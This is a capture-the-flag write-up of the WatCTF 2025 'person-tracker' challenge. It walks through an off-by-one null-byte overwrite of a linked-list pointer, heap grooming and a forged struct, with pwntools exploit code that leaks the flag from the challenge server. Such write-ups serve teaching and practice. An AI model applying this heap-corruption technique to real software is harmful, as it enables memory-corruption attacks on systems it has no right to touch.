---
title: "WatCTF 2025 – person-tracker: One Byte to Rule Them All"
date: 2025-09-11
toc: true
---

> *"I forget people's names all the time, so I made a tool to make it easier"*  

### TL;DR

Off-by-one in `fgets(new->name, sizeof(name) + 1, ...)` writes a terminating `'\0'` one byte past the 24-byte `name` buffer and **clears the least-significant byte** of the `next` pointer (little-endian). By heap grooming we pick a node whose `next` LSB-zeroing moves the pointer into a memory area we control, write a fake `Person` there (with `next = &FLAG - 0x8`), then `view` the forged node’s `name` to leak the flag.

We were given the following files:

```bash
┌──(kali㉿kali)-[~/Desktop/ctfs/watctf/person-tracker]
└─$ ls -la
total 900
drwxrwxr-x 2 kali kali   4096 Sep 11 10:13 .
drwxrwxr-x 7 kali kali   4096 Sep 11 10:13 ..
-rwxrwxr-x 1 kali kali 908456 Sep 10 16:50 main
-rw-rw-r-- 1 kali kali   3486 Sep 10 15:00 main.c
```

`main` is a statically linked 64-bit ELF:

```bash
$ file ./main
main: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.10.0, not stripped

$ pwn checksec ./main 
[*] '/home/kali/Desktop/ctfs/watctf/person-tracker/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Running it shows a simple menu:

```bash
$ ./main                        
Welcome to the Person Tracker!
MENU CHOICES:
1. Add a new person
2. View a person's information
3. Update a person's information
Enter your choice: ^C
```

### Dissecting the Program

According to the menu we can add, view and update a person. The person information is stored in objects of type person which is defined as:

```c
typedef struct Person {
    uint64_t age;
    char name[24];
    struct Person *next;
} Person;
```

From the source code we can see that there are a few global variables:

```c
#ifdef FLAGVAR
// In the server-side binary, `FLAGVAR` is set to the flag
const volatile char * const FLAG = FLAGVAR;
#else
const volatile char * const FLAG = "fakectf{not the real flag}";
#endif

Person *root = NULL;
uint64_t person_count = 0;
```

The first one, `FLAG`, is a global pointer that holds the location of the flag string. In the provided source it just points to `"fakectf{not the real flag}"`, but in the challenge binary it’s compiled with the actual flag through `FLAGVAR`. We can look the flag pointer in gdb:

```bash
pwndbg> x/gx &FLAG
0x49d430 <FLAG>:        0x000000000049b21e
pwndbg> x/s 0x000000000049b21e
0x49b21e:       "fakectf{not the real flag}"
```

Next, `root` is the head of the linked list. It starts off as `NULL` and every time we add a new `Person` it gets prepended and becomes the new `root`. This effectively makes the data structure behave like a stack (LIFO).

```bash
$ readelf -s ./main | grep root
   505: 00000000004ced10     8 OBJECT  LOCAL  DEFAULT   19 root
  1546: 00000000004c9a58     8 OBJECT  GLOBAL DEFAULT   19 root
```

Finally, `person_count` is just a counter of how many `Person` structs we’ve allocated. It’s used for bounds checks in the “view” and “update” functionality to make sure the index we request is valid.

The `person_at_index(idx)` traverses the linked list starting from `root` until the index reaches zero. Because of the LIFO insertion logic, the **most recently added person is at index 0**, the second most recent at index 1, and so on. 

```c
Person *person_at_index(int idx) {
    Person *res = root;
    while (idx > 0) {
        res = res->next;
        idx--;
    }
    return res;
}
```

The `main` function just runs an infinite menu loop, reads the user’s choice, and dispatches to either the add, view, or update functionality.

```c
int main() {
    puts("Welcome to the Person Tracker!");
    while(1) {
        puts("MENU CHOICES:");
        puts("1. Add a new person");
        puts("2. View a person's information");
        puts("3. Update a person's information");
        printf("Enter your choice: ");
        fflush(stdout);
        int choice;
        if (scanf("%d", &choice) != 1) {
            printf("Invalid input. Please enter a number.\n");
            while (getchar() != '\n'); 
            continue;
        }
        getchar();
        if (choice == 1) {
			// add functionality
			...SNIP...
        } else if (choice == 2) {
			// view functionality
			...SNIP...
        } else if (choice == 3) {
			// update functionality
			...SNIP...
        }
    }
}
```

The **add functionality** allocates a new `Person` struct on the heap. Each `Person` is `0x28` bytes of user data (`age`, `name`, and `next`), which together with malloc metadata makes a `0x30`-sized chunk. After allocation, it links the new person by setting `new->next = root`, then updates `root = new`. This effectively prepends the struct to the front of the list, giving us a **singly linked list with LIFO (stack-like) behavior**. Finally, it increments `person_count` and asks the user to fill in the `age` and `name` fields.

```c
if (choice == 1) {
	Person *new = malloc(sizeof(Person));
	new->next = root;
	root = new;
	person_count++;
...SNIP...
} 
```

The **view functionality** first asks for an index and ensures it’s within bounds (`0 <= idx < person_count`), preventing out-of-bounds reads. It then calls `person_at_index(idx)` to fetch the correct `Person`. Finally, the program asks whether to print the `age` or the `name` and outputs the chosen field.

```c
else if (choice == 2) {
	printf("Specify the index of the person: ");
	fflush(stdout);
	int idx;
	scanf("%d", &idx);
	getchar();
	if (idx < 0 || idx >= person_count) {
		puts("Invalid index!");
		continue;
	}
	Person *p = person_at_index(idx);
	puts("What information do you want to view?");
	puts("1. Their age");
	puts("2. Their name");
	printf("Enter choice: ");
	fflush(stdout);
	int choice2;
	scanf("%d", &choice2);
	getchar();
	if (choice2 == 1) {
		printf("Their age is %lu\n", p->age);
	} else if (choice2 == 2) {
		printf("Their name is %s\n", p->name);
	}
}
```

The **update functionality** lets the user change either the `age` or the `name` of a `Person`. Updating the `age` is straightforward, but updating the `name` introduces a subtle **off-by-one vulnerability**:

The program calls `fgets` with `sizeof(p->name) + 1`, which allows writing a **null byte past the end of the `name` buffer**. This off-by-one null-byte overwrite can corrupt the adjacent `next` pointer inside the struct. With careful setup, this can be exploited by making the `next` of the last person (the `root`) point to a **fake `Person` struct**. If that fake struct’s `next` points to the `FLAG`, we can then leak the flag through the **view functionality**.

```c
if (choice2 == 1) {
	printf("Enter their age: ");
	fflush(stdout);
	scanf("%lu", &p->age);
	getchar();
} else if (choice2 == 2) {
	printf("Enter the new name: ");
	fflush(stdout);
	fgets(p->name, sizeof(p->name) + 1, stdin); // +1 for null byte
}
```

Now that we understand the code, let’s see what the linked list looks like in memory. We’ll allocate three `Person` structs and then inspect them in `gdb`.

```bash
$ gdb -q ./main
pwndbg> r
... allocate 3 persons (abc, def, xyz) ...
^C   # stop execution
```

Because the binary is statically linked, `pwndbg` can’t auto-detect glibc. We can find the version by searching strings in the binary:

```bash
$ strings main | grep glibc-                       
...SNIP...
/nix/store/q4wq65gl3r8fy746v9bbwgx4gzn0r2kl-glibc-2.40-66/lib/
```

So we’re using `glibc 2.40`. We can setup the glibc using the following command:

```bash
pwndbg> set glibc 2.40
```

There’s a lot of extra noise on the heap, so instead of dumping everything we use `vis [count] [addr]` to just display our `Person` structs:

```bash
pwndbg> vis 5 0x4d2080
```

![](https://github.com/user-attachments/assets/be90bebc-05dc-4eed-8afb-cffd73c8febc)

We also confirm where `root` points:

```
pwndbg> x/gx &root
0x4c9a58 <root>:        0x00000000004d20f0
```

That address is the most recent allocation, so the linked list is indeed **LIFO (stack-like)**.

```
root ──► [0x4d2060] Person #3
          age: 14
          name: "xyz"
          next ──► [0x4d20c0] Person #2
                      age: 24
                      name: "def"
                      next ──► [0x4d2120] Person #1
                                      age: 12
                                      name: "abc"
                                      next ──► NULL
```

### Exploitation
We’ve already seen how the program manages `add`, `view`, and `update`, and how the linked list is structured in memory. Now let’s dive into the off-by-one bug and use it to leak the flag.

First, we set up some helper functions to interact with the binary:

```python
def add(age, name):
   io.sendlineafter(b": ", b"1")
   io.sendlineafter(b"age: ", str(age).encode())
   io.sendlineafter(b"name: ", name)

def view(idx, choice):
   io.sendlineafter(b": ", b"2")
   io.sendlineafter(b"person: ", str(idx).encode())
   io.sendlineafter(b"choice: ", str(choice).encode())
   io.recvuntil(b" is ")
   return io.recvline().strip()

def update(idx, choice, data):
   io.sendlineafter(b": ", b"3")
   io.sendlineafter(b"person: ", str(idx).encode())
   io.sendlineafter(b"choice: ", str(choice).encode())
   io.sendlineafter(b": ", data)
```


We can trigger the off-by-one by allocating two chunks and then and performing an update that overwrites the `next` pointer’s last byte with a null.

```python
add(12, b"A"*8)
add(12, b"A"*8)

update(0, 2, b"B"*0x18)
```

Running under `GDB NOASLR` and inspecting with `vis`:

```
pwndbg> vis 3 0x4d2c80
```

![](https://github.com/user-attachments/assets/42b5f88c-c876-483f-bf2c-8b6c1caa2868)

The `next` pointer now reads `0x4d2c00` instead of `0x4d2cc0`. This confirms the null-byte overwrite. However, that address isn’t useful to us yet.

To land the truncated pointer in a controllable region, we allocate more chunks:
```python
for i in range(10):
   add(12, b"A"*8)

update(0, 2, b"B"*0x18)
```

After inspection, we see that the corrupted `next` pointer of the last `Person` struct becomes:

```
root ──► [0x4d2e60] Person (last)
          ...
          next ──► 0x4d2e00   <-- corrupted by null-byte overwrite
```

This means the program will now treat `0x4d2e00` as if it were another valid `Person`.
Inside that fake `Person`, the field we actually control is its **own `next` pointer**, which sits at:

```
&root->next->next = 0x4d2e20
```

Conveniently, this region overlaps with the buffer belonging to the **second-last allocated chunk** (index 1). This means that by updating the name of index 1, we are not just changing a string — we are actually writing into the memory that will later be interpreted as the `next` pointer of our fake `Person`.

```python
update(1, 2, p64(0x00) + p64(0x49b21e - 0x08))
update(0, 2, b"B"*0x18)
```

This lets us **redirect the traversal** to any arbitrary address (in our case, the `&FLAG`).
The corrupted linked list looks something like this:

```
root ──► Person #2 (idx 0)
          next ──► Fake Person (0x4d2e00)
                          next ──► &FLAG-0x8
                                        name ──► "fakectf{not the real flag}"
```

So when we finally call `view(2, 2)`, the program walks the linked list into our crafted fake struct, reads the `next` pointer that we set to `FLAG-0x8`, and treats it as though it were the `name` of a real `Person`. The view routine happily prints it out, and that’s how the flag leaks.

```python
update(1, 2, p64(0) + p64(0x49b21e-0x8))
update(0, 2, b"B"*24)
print(view(2, 2))
```

![](https://github.com/user-attachments/assets/f3cda9d0-f925-42fd-9aab-9617d247ca89)


With the local exploit working, the next step was to run it against the challenge server:

```python
io = remote("challs.watctf.org", 5151)

for i in range(10):
   add(12, b"A"*8)

update(1, 2, p64(0) + p64(0x49b21e-0x8))
update(0, 2, b"B"*24)
print(view(2, 2))
```

But instead of a flag, I got an error:

![](https://github.com/user-attachments/assets/7e7cdfa1-5c4b-4770-8755-4a7d292bee3f)

At first glance the logic was identical to my local setup, so why didn’t it work remotely?  
The answer was **heap alignment**. With 10 allocations, the corrupted `next` pointer ended up pointing into a region that didn’t overlap nicely with any controllable chunk. In other words, the “fake struct” I wanted to edit wasn’t actually lining up with the chunk I had access to.

To fix this, I brute-forced the number of allocations until the layout matched. It turned out that **6 allocations** aligned things perfectly:

```python
io = remote("challs.watctf.org", 5151)

for i in range(6):
   add(12, b"A"*8)

update(1, 2, p64(0) + p64(0x49b21e-0x8))
update(0, 2, b"B"*24)
print(view(2, 2))
```

![](https://github.com/user-attachments/assets/d983f599-7c32-4db3-b884-5061f31e63c0)

So what changed? With **6 chunks**, the corrupted `next` pointer of the last person struct pointed into an address (`0x4d2e20`) that overlapped exactly with the second-to-last chunk. That meant I could use `update(1, …)` to overwrite the `next` pointer of my fake struct directly. From there, the view function happily followed the chain to the `FLAG` address, and printing the `name` field gave me the flag.

This is a classic case of **heap feng shui**: the exploit was sound, but without the right number of allocations the memory alignment didn’t let me reach my fake struct. A single change — going from 10 chunks to 6 — shifted the layout enough to make everything line up.

You can find the full exploit script [here](https://raw.githubusercontent.com/z0v3r1n/z0v3r1n.github.io/refs/heads/main/content/posts/watctf_f25_person_tracker/exploit.py).


### Conclusion

This challenge showed how a single-byte off-by-one can become powerful. By nulling the LSB of the `next` pointer we redirected the linked list into a fake `Person` under our control, then chained it to the `FLAG`. The tricky part was alignment — the exploit failed with 10 allocations but worked with 6. In the end, one stray `'\0'` was enough to walk the list straight to the flag. A fun reminder that in exploitation, **one byte is all it takes**.
